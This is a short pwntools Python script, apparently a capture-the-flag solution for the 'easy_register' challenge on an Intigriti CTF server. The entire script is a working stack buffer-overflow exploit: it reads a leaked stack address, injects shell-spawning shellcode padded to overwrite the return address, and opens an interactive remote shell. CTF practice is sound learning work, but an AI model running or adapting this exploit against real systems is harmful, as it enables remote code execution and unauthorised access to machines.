from pwn import *

# p = process('./easy_register')
p = remote('easyregister.ctf.intigriti.io', 7777)
e = context.binary = ELF('./easy_register')

p.recvuntil(b' at ')
addr = int(p.recvuntil(b'.')[:-1], 16)
print(hex(addr))

payload = asm(shellcraft.sh())
payload += b'A' * (0x58 - len(payload))
payload += p64(addr)

p.sendline(payload)
p.interactive()
